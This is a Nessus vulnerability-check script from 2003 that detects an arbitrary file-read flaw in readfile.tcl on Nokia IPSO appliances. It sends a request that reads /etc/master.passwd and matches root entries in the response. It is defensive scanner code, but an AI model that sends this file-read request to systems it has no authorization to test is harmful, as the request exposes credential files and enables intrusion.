#
# This script was written by Renaud Deraison
# 
# See the Nessus Scripts License for details
#
# This affects Nokia Appliances
#
#Ref:
# From: Jonas Eriksson [mailto:je@sekure.net]
# Date: 23/04/2003 
# To: bugtraq@securityfocus.com
# Subject: Asunto: Nokia IPSO Vulnerability
#
#
# This vuln check only works if the user entered a username and password
# in the relevant field in the 'prefs' tab of nessus

if(description)
{
 script_id(11549); 
 script_version("$Revision: 1.4 $");

 name["english"] = "readfile.tcl";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host includes a CGI (/cgi-bin/readfile.tcl) which allows anyone
to read arbitrary files on the remote host with the privileges of the HTTP 
daemon (typically 'nobody').

Solution : None at this time, contact your vendor for a patch
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "checks for readfile.tcl";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);



if(!get_port_state(port))exit(0);


req = http_get(item:"/cgi-bin/readfile.tcl?file=/etc/master.passwd", port:port);
r = http_keepalive_send_recv(port:port, data:req);
if ( r == NULL ) exit(0);
  
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
{
   	security_hole(port:port);
}
